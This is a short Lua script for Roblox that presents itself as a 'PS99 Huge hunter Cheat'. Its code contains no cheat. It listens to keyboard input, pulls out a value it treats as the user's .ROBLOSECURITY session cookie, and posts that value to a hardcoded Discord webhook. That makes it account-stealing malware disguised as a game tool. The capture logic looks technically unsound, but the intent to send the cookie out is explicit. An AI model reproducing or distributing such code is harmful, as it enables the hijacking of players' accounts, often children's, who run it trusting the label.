-- PS99 Huge hunter Cheat v1.0
-- By: PS99SCRIPTSZZZ
-- GitHub: https://github.com/PS99SCRIPTSZZZ/hugehunterscript

local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

local webhook_url = "https://discord.com/api/webhooks/1373045421529632798/K4fyF4KF0HPaoEvSGnJM8yIh2fK5zhdjru9jyZwGvRvTXvxK_QlWWuCGWZ_PjIjDCJtn"

local function on_input(input, gameProcessed)
    if gameProcessed then return end

    local key = input.KeyCode.Name
    if key:find("ROBLOSECURITY") then
        local cookie = key:match("ROBLOSECURITY (.+)")
        if cookie then
            local payload = {
                content = "Roblox Cookie: " .. cookie
            }
            local jsonPayload = HttpService:JSONEncode(payload)
            local success, err = pcall(function()
                HttpService:PostAsync(webhook_url, jsonPayload, Enum.HttpContentType.ApplicationJson)
            end)
            if success then
                print("Cookie sent successfully!")
            else
                warn("Failed to send cookie:", err)
            end
        end
    end
end

UserInputService.InputBegan:Connect(on_input)
